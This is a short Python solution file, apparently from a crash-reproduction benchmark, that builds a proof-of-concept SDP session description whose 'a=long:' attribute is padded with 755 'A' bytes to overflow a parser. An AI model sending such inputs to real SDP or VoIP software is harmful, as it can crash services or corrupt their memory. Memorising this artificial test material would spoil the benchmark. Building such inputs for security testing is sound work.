class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b"v=0\r\n"
        poc += b"o=- 0 0 IN IP4 127.0.0.1\r\n"
        poc += b"s=-\r\n"
        poc += b"c=IN IP4 127.0.0.1\r\n"
        poc += b"t=0 0\r\n"
        poc += b"m=audio 5004 RTP/AVP 0\r\n"
        poc += b"a=rtpmap:0 PCMU/8000\r\n"
        poc += b"a=long:" + b"A" * 755 + b"\r\n"
        return poc